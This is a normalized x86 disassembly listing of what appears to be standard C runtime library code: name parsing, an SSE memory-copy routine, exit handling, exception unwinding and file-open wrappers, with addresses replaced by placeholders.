lea ecx [ ebp - 0x20 ]
call sub_4107aa
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push 0x27
mov [ ebp - 0x4 ] eax
call sub_410f18
lea eax [ ebp - 0x8 ]
mov ecx esi
push eax
call sub_410ed5
mov eax [ rw-data ]
cmp [ eax ] 0x40
jne r-xdata
push 0x7d
mov ecx esi
call sub_410f18
mov eax [ rw-data ]
push ebx
mov ecx esi
call sub_41102e
cmp [ esi + 0x4 ] bl
jg r-xdata
inc eax
mov [ rw-data ] eax
cmp [ eax ] 0x40
je r-xdata
cmp [ esi + 0x4 ] bl
jg r-xdata
push r--data
jmp r-xdata
mov ecx esi
call sub_410fcd
mov eax [ rw-data ]
sub_41609f
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ rw-data ]
push edi
mov edi [ ebp + 0x8 ]
mov bl [ esi ]
movsx eax bl
sub eax 0x30
cmp eax 0x9
ja r-xdata
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x18 ] 0xffff0000
cmp bl 0x3f
jne r-xdata
mov ecx [ rw-data ]
inc esi
push eax
push edi
mov [ rw-data ] esi
call sub_410c08
jmp r-xdata
mov eax r--data
push 0x13
push eax
push esi
mov [ ebp - 0x28 ] eax
call sub_4164e5
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x34 ]
push 0x0
push eax
call sub_41577a
pop ecx
pop ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x1c ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x18 ] eax
mov al [ ecx ]
inc ecx
mov [ rw-data ] ecx
cmp al 0x40
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov eax r--data
push 0xd
push eax
push esi
mov [ ebp - 0x28 ] eax
call sub_4164e5
add esp 0xc
test eax eax
jne r-xdata
add esi 0x13
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
dec ecx
xor eax eax
mov [ rw-data ] ecx
cmp [ ecx ] al
lea ecx [ ebp - 0x1c ]
setne al
inc eax
push eax
call sub_410bd3
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add esi 0xd
lea eax [ ebp - 0x24 ]
mov [ rw-data ] esi
push eax
call sub_414ecf
test [ rw-data ] 0x4000
pop ecx
je r-xdata
mov eax [ ebp - 0x1c ]
mov [ edi ] eax
mov eax [ ebp - 0x18 ]
mov [ edi + 0x4 ] eax
mov ecx [ rw-data ]
cmp [ ecx ] 0x9
je r-xdata
push 0x40
push rw-data
lea ecx [ ebp - 0x3c ]
call sub_4106db
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x1c ] ecx
cmp bl 0x40
jne r-xdata
push r--data
lea ecx [ ebp - 0x1c ]
call sub_410ba1
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
push [ ebp - 0x28 ]
lea ecx [ ebp - 0x3c ]
call sub_410823
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x34 ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x30 ]
push r--data
mov [ ebp - 0x20 ] eax
call sub_410fcd
lea eax [ ebp - 0x24 ]
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
call sub_41106e
mov eax [ ebp - 0x38 ]
and [ ebp - 0x1c ] 0x0
and eax 0xffff0000
inc esi
mov [ rw-data ] esi
jmp r-xdata
push 0x10
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x24 ]
call sub_414f5f
lea eax [ ebp - 0x14 ]
push eax
call sub_42f290
mov esi [ rw-data ]
pop ecx
push eax
mov ecx esi
call j_sub_40d468
call esi
pop ecx
lea ecx [ ebp - 0x1c ]
test eax eax
je r-xdata
mov [ ebp - 0x18 ] eax
push r--data
call sub_410ba1
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
push [ ebp - 0x28 ]
lea ecx [ ebp - 0x3c ]
call sub_410823
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x30 ]
push r--data
mov [ ebp - 0x28 ] eax
call sub_410fcd
lea eax [ ebp - 0x2c ]
jmp r-xdata
push eax
call sub_410ba1
jmp r-xdata
push eax
lea ecx [ ebp - 0x1c ]
call sub_410ed5
jmp r-xdata
sub_416363
push edi
mov edi [ ecx ]
test edi edi
jne r-xdata
mov eax [ edi ]
push esi
mov esi [ eax ]
mov ecx esi
call j_sub_40d468
mov ecx edi
call esi
pop esi
pop edi
retn
xor eax eax
pop edi
retn
sub_416397
push ebp
mov ebp esp
push ecx
mov eax ecx
mov [ ebp - 0x4 ] eax
cmp [ eax + 0xc ] 0x0
jge r-xdata
mov eax [ eax + 0xc ]
mov esp ebp
pop ebp
retn
push ebx
mov ebx [ eax + 0x4 ]
push esi
push edi
mov edi [ eax + 0x8 ]
mov eax [ edi ]
mov esi [ eax ]
mov ecx esi
call j_sub_40d468
mov ecx edi
call esi
mov edx [ ebx ]
mov edi eax
mov esi [ edx ]
mov ecx esi
call j_sub_40d468
mov ecx ebx
call esi
add edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
pop edi
pop esi
pop ebx
sub_4163e5
push ebp
mov ebp esp
mov eax [ rw-data ]
test al 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x3
ja r-xdata
xor ecx ecx
mov [ rw-data ] 0x4
inc ecx
mov [ rw-data ] 0x2
or eax ecx
mov [ rw-data ] ecx
xor edx edx
mov [ rw-data ] eax
mov eax r--data
mov [ rw-data ] edx
mov [ rw-data ] eax
mov [ rw-data ] edx
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov [ rw-data ] eax
mov [ rw-data ] 0x3
mov [ rw-data ] edx
mov eax rw-data
pop ebp
retn
imul eax eax 0xc
add eax rw-data
pop ebp
retn
sub_4164af
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
test edx edx
je r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
sub esi ecx
mov al [ esi + ecx ]
mov [ ecx ] al
inc ecx
sub edx 0x1
jne r-xdata
pop esi
sub_4164e5
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push ebx
pop ebp
retn
movzx eax [ edx ]
movzx ecx [ ecx ]
sub eax ecx
pop ebx
pop ebp
retn
mov bl [ edx ]
test bl bl
je r-xdata
cmp bl [ ecx ]
jne r-xdata
inc edx
inc ecx
jmp r-xdata
sub eax 0x1
je r-xdata
sub_416516
push 0x64
push r--data
call sub_40d260
mov edi [ ebp + 0x14 ]
test edi edi
jne r-xdata
xor esi esi
mov [ ebp - 0x1c ] esi
push esi
call sub_41062a
pop ecx
mov [ ebp - 0x4 ] esi
mov [ rw-data ] edi
mov eax [ ebp + 0x18 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
movzx eax [ ebp + 0x1c ]
push eax
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x74 ]
call sub_4109e3
lea ecx [ ebp - 0x74 ]
call sub_410c44
mov edi eax
mov [ ebp - 0x1c ] edi
mov ecx rw-data
call sub_4110f1
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4165a3
mov eax edi
xor eax eax
jmp r-xdata
call sub_40d2a6
retn
sub_4165ab
push 0x64
push r--data
call sub_40d260
mov edi [ ebp + 0x14 ]
test edi edi
jne r-xdata
xor esi esi
mov [ ebp - 0x1c ] esi
push esi
call sub_41062a
pop ecx
mov [ ebp - 0x4 ] esi
mov [ rw-data ] edi
mov eax [ ebp + 0x18 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x74 ]
call sub_4109e3
lea ecx [ ebp - 0x74 ]
call sub_410c44
mov edi eax
mov [ ebp - 0x1c ] edi
mov ecx rw-data
call sub_4110f1
mov [ ebp - 0x4 ] 0xfffffffe
call sub_416638
mov eax edi
xor eax eax
jmp r-xdata
call sub_40d2a6
retn
sub_416640
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4019d0
push [ eax + 0x4 ]
push [ eax ]
call sub_428fb1
add esp 0x1c
test eax eax
jns r-xdata
pop ebp
retn
or eax 0xffffffff
sub_416670
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416690
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_40c3ae
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_4166d5
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_4166d5
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_416690
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_416785
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_4167a4
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_41677c
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_416785
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_416810
push edi
push esi
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0xc ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x20
jb r-xdata
cmp edi eax
jb r-xdata
and ecx 0x1f
je r-xdata
cmp ecx 0x80
jae r-xdata
lea esi [ ecx + esi ]
lea edi [ ecx + edi ]
cmp ecx 0x20
jb r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov eax ecx
shr ecx 0x2
je r-xdata
bt [ rw-data ] 0x1
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
test ecx 0xfffffffc
je r-xdata
bt [ rw-data ] 0x1
jb r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
add edi 0x4
add esi 0x4
sub ecx 0x1
jne r-xdata
mov eax edi
xor eax esi
test eax 0xf
jne r-xdata
[ edi ] [ esi ]
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
test ecx ecx
je r-xdata
jmp r-xdata
test ecx ecx
je r-xdata
sub edi 0x4
sub esi 0x4
mov eax [ esi ]
mov [ edi ] eax
sub ecx 0x4
test ecx 0xfffffffc
jne r-xdata
test edi 0xf
je r-xdata
test edi 0x3
je r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
bt [ rw-data ] 0x0
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
mov edx ecx
shr edx 0x5
test edx edx
je r-xdata
test edi 0x3
je r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
sub edi 0x1
sub esi 0x1
mov al [ esi ]
mov [ edi ] al
sub ecx 0x1
jne r-xdata
cmp ecx 0x80
jb r-xdata
dec ecx
dec esi
dec edi
mov al [ esi ]
mov [ edi ] al
test edi 0xf
jne r-xdata
cmp ecx 0x20
jb r-xdata
mov edx edi
and edx 0x3
sub ecx edx
lea esp [ esp ]
lea ecx [ ecx ]
test edi 0x3
jne r-xdata
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
lea ebx [ ebx ]
mov edx ecx
cmp ecx 0x20
jb r-xdata
mov al [ esi ]
mov [ edi ] al
dec ecx
add esi 0x1
add edi 0x1
test edi 0x3
jne r-xdata
cmp ecx 0x20
jb r-xdata
sub esi 0x80
sub edi 0x80
movdqu xmm0 [ esi ]
movdqu xmm1 [ esi + 0x10 ]
movdqu xmm2 [ esi + 0x20 ]
movdqu xmm3 [ esi + 0x30 ]
movdqu xmm4 [ esi + 0x40 ]
movdqu xmm5 [ esi + 0x50 ]
movdqu xmm6 [ esi + 0x60 ]
movdqu xmm7 [ esi + 0x70 ]
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm1
movdqu [ edi + 0x20 ] xmm2
movdqu [ edi + 0x30 ] xmm3
movdqu [ edi + 0x40 ] xmm4
movdqu [ edi + 0x50 ] xmm5
movdqu [ edi + 0x60 ] xmm6
movdqu [ edi + 0x70 ] xmm7
sub ecx 0x80
test ecx 0xffffff80
jne r-xdata
mov edx ecx
shr ecx 0x2
and edx 0x3
sub esi 0x4
sub edi 0x4
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + r-xdata ]
mov al [ esi - 0x1 ]
mov [ edi - 0x1 ] al
dec esi
dec edi
sub edx 0x1
jne r-xdata
test esi 0x3
jne r-xdata
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
movdqu xmm0 [ esi ]
movdqu xmm1 [ esi + 0x10 ]
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm1
lea esi [ esi + 0x20 ]
lea edi [ edi + 0x20 ]
dec edx
jne r-xdata
shr ecx 0x2
[ edi ] [ esi ]
and edx 0x3
jmp [ edx * 4 + r-xdata ]
sub esi 0x20
sub edi 0x20
movdqu xmm0 [ esi ]
movdqu xmm1 [ esi + 0x10 ]
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm1
sub ecx 0x20
test ecx 0xffffffe0
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
bt edi 0x2
jae r-xdata
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
lea esp [ esp ]
mov edi edi
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
bt edi 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
test esi 0x7
je r-xdata
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
movdqa xmm1 [ esi - 0x8 ]
lea esi [ esi - 0x8 ]
lea ecx [ ecx ]
bt esi 0x3
jae r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x8
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x8
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x8
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x8 ]
jmp r-xdata
movdqa xmm1 [ esi - 0x4 ]
lea esi [ esi - 0x4 ]
mov edi edi
movdqa xmm1 [ esi - 0xc ]
lea esi [ esi - 0xc ]
mov edi edi
cmp ecx 0x10
jl r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x4
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x4
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x4
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x4 ]
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0xc
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0xc
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0xc
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0xc ]
jmp r-xdata
bt ecx 0x2
jae r-xdata
movdqu xmm1 [ esi ]
sub ecx 0x10
lea esi [ esi + 0x10 ]
movdqa [ edi ] xmm1
lea edi [ edi + 0x10 ]
jmp r-xdata
bt ecx 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
mov eax [ ecx * 4 + r-xdata ]
jmp eax
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
sub_416e01
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_41069b
mov edx eax
mov eax rw-data
pop ecx
xchg [ eax ] edx
mov eax [ rw-data ]
mov ecx eax
and ecx 0x1f
xor eax edx
ror eax cl
pop ebp
retn
sub_416e54
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
mov eax [ ebp + 0x8 ]
ror eax cl
xor eax [ rw-data ]
pop ebp
retn
sub_416f05
push 0xc
push r--data
call sub_4497c0
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
push 0x2
call sub_42f32c
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
jne r-xdata
call sub_41703f
test al al
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41700f
test esi esi
jne r-xdata
xor eax eax
inc eax
mov ecx rw-data
xchg [ ecx ] eax
mov [ ebp - 0x4 ] 0x1
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
push [ ebp + 0x8 ]
call sub_417083
pop ecx
call sub_449809
retn
push [ ebp + 0x8 ]
call sub_41701e
cmp edi 0x1
jne r-xdata
mov ebx [ rw-data ]
mov edx ebx
and edx 0x1f
push 0x20
pop ecx
sub ecx edx
xor eax eax
ror eax cl
xor eax ebx
mov ecx [ rw-data ]
cmp ecx eax
je r-xdata
and [ ebp - 0x4 ] 0x0
test edi edi
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
xor ebx ecx
xor eax eax
push eax
push eax
push eax
mov ecx edx
ror ebx cl
mov ecx ebx
call [ r--data ]
call ebx
push r--data
push r--data
call sub_42ae9d
pop ecx
pop ecx
test esi esi
jne r-xdata
push r--data
push r--data
call sub_42ae9d
pop ecx
pop ecx
call sub_42ca8c
pop ecx
mov [ rw-data ] 0x1
sub_41703f
push 0x0
call [ GetModuleHandleW@IAT ]
mov ecx eax
test ecx ecx
jne r-xdata
mov eax 0x5a4d
cmp [ ecx ] ax
jne r-xdata
xor al al
retn
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
jne r-xdata
cmp [ eax + 0x74 ] 0xe
jbe r-xdata
cmp [ eax + 0xe8 ] 0x0
setne al
retn
sub_417083
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push r--data
push 0x0
call [ GetModuleHandleExW@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push esi
push r--data
push [ ebp - 0x8 ]
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn
push [ ebp - 0x8 ]
call [ FreeLibrary@IAT ]
pop esi
push [ ebp + 0x8 ]
mov ecx esi
call [ r--data ]
call esi
sub_41714c
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
cmp [ rw-data ] eax
jne sub_42cf31
push [ ebp + 0x8 ]
call sub_416e54
pop ecx
mov [ rw-data ] eax
pop ebp
retn
sub_417242
mov eax [ rw-data ]
push esi
push 0x3
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_42d196
push 0x0
mov [ rw-data ] eax
call sub_42d0aa
add esp 0xc
cmp [ rw-data ] 0x0
jne r-xdata
mov eax esi
mov [ rw-data ] eax
push edi
xor edi edi
mov esi rw-data
push 0x4
push esi
mov [ rw-data ] esi
call sub_42d196
push 0x0
mov [ rw-data ] eax
call sub_42d0aa
add esp 0xc
cmp [ rw-data ] 0x0
jne r-xdata
mov [ esi + 0x10 ] 0xfffffffe
cmp eax 0xfffffffe
je r-xdata
or eax 0xffffffff
pop esi
retn
push 0x0
push 0xfa0
lea eax [ esi + 0x20 ]
push eax
call sub_430c30
mov eax [ rw-data ]
mov edx edi
sar edx 0x6
mov [ eax + edi * 4 ] esi
mov eax edi
and eax 0x3f
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
mov eax [ eax + ecx + 0x18 ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add esi 0x38
inc edi
cmp esi rw-data
jne r-xdata
sub_41731c
push esi
call sub_431436
call sub_4312a8
xor esi esi
mov eax [ rw-data ]
push [ esi + eax ]
call sub_43157c
mov eax [ rw-data ]
pop ecx
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
add esi 0x4
cmp esi 0xc
jne r-xdata
push [ rw-data ]
call sub_42d0aa
and [ rw-data ] 0x0
pop ecx
pop esi
retn
sub_417366
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
push 0x16
pop eax
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
lea eax [ ecx + 0x4 ]
mov [ edx ] eax
mov edx [ ebp + 0x14 ]
test edx edx
je r-xdata
mov [ eax ] ecx
xor eax eax
pop ebp
retn
lea eax [ ecx + 0x8 ]
mov [ edx ] eax
sub_4173d4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push 0x80
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_417462
add esp 0xc
mov [ esi ] eax
test eax eax
jne r-xdata
call sub_42fef5
push 0x16
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
jmp r-xdata
xor eax eax
call sub_42fef5
mov eax [ eax ]
jmp r-xdata
pop esi
pop ebp
retn
sub_41741b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push 0x80
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_417523
add esp 0xc
mov [ esi ] eax
test eax eax
jne r-xdata
call sub_42fef5
push 0x16
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
jmp r-xdata
xor eax eax
call sub_42fef5
mov eax [ eax ]
jmp r-xdata
pop esi
pop ebp
retn
sub_417462
push 0x10
push r--data
call sub_40d260
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
test edi edi
setne al
test eax eax
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor eax eax
cmp [ edi ] al
setne al
test eax eax
je r-xdata
call sub_40d2a6
retn
cmp [ esi ] 0x0
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
call sub_431804
pop ecx
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
jmp r-xdata
and [ ebp - 0x20 ] 0x0
and [ ebp - 0x4 ] 0x0
push [ ebp - 0x1c ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_43219e
add esp 0x10
mov esi eax
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41750c
mov eax esi
call sub_42fef5
mov [ eax ] 0x18
jmp r-xdata
xor eax eax
jmp r-xdata
sub_417523
push 0x10
push r--data
call sub_40d260
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
test edi edi
setne al
test eax eax
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor eax eax
xor ebx ebx
cmp [ edi ] bx
setne al
test eax eax
je r-xdata
call sub_40d2a6
retn
cmp [ esi ] bx
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
call sub_431804
pop ecx
cmp [ ebp - 0x1c ] ebx
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
jmp r-xdata
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
push [ ebp - 0x1c ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_4321a9
add esp 0x10
mov esi eax
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4175cd
mov eax esi
call sub_42fef5
mov [ eax ] 0x18
jmp r-xdata
xor eax eax
jmp r-xdata
sub_4175e4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_43219e
add esp 0x10
pop ebp
retn
sub_417607
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4321a9
add esp 0x10
pop ebp
retn
sub_417660
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push 0x80
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_417523
add esp 0xc
mov [ esi ] eax
test eax eax
jne r-xdata
call sub_42fef5
push 0x16
pop esi
mov [ eax ] esi
call sub_42fdcf
jmp r-xdata
xor esi esi
call sub_42fef5
mov esi [ eax ]
jmp r-xdata
mov eax esi
